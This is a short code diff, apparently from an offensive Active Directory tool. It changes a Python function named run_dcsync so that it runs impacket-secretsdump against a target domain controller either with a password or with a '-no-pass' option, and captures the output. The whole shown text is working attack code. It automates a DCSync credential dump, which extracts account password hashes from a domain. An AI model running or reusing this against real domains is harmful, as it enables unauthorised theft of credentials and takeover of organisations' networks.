@@ -21,10 +21,16 @@ CONTROL_ACCESS = 0x00000100
 GENERIC_ALL = 0x10000000
 
 
-def run_dcsync(domain, username, password, target):
-    credential = f"{domain}/{username}:{password}@{target}"
+def run_dcsync(domain, username, password, target, *, no_pass=False):
+    if no_pass:
+        credential = f"{domain}/{username}@{target}"
+        command = ["impacket-secretsdump", "-no-pass", credential]
+    else:
+        credential = f"{domain}/{username}:{password}@{target}"
+        command = ["impacket-secretsdump", credential]
+
     output = subprocess.run(
-        ["impacket-secretsdump", credential],
+        command,
         capture_output=True,
         text=True,
     )
